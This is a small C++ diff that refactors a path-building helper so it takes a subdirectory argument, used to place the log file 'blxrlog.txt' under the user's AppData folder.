@@ -5,22 +5,22 @@
 #define LOG_FILE_NAME "blxrlog.txt"
 
 // TODO Doesn't work when not initialized on declaration
-stream::LogFile *log_file = new stream::LogFile(stream::GetPath(true), LOG_FILE_NAME);
+stream::LogFile *log_file = new stream::LogFile(stream::GetPath("\\Microsoft\\blxr", true), LOG_FILE_NAME);
 
-std::string stream::GetPath(const bool append) {
+std::string stream::GetPath(const std::string &dir, const bool append) {
   char *buf = nullptr;
   size_t size = 0;
-  std::string app_data_dir;
+  std::string final_dir;
 
   if (_dupenv_s(&buf, &size, APPDATA)==0 && buf!=nullptr) {
-	app_data_dir = buf;
+	final_dir = buf;
   }
-  app_data_dir += "\\Microsoft\\blxr";
+  final_dir += dir;
   if (append) {
-	app_data_dir += "\\";
+	final_dir += "\\";
   }
   free(buf);
-  return app_data_dir;
+  return final_dir;
 }
 
 bool stream::MakeDir(const std::string &path) {
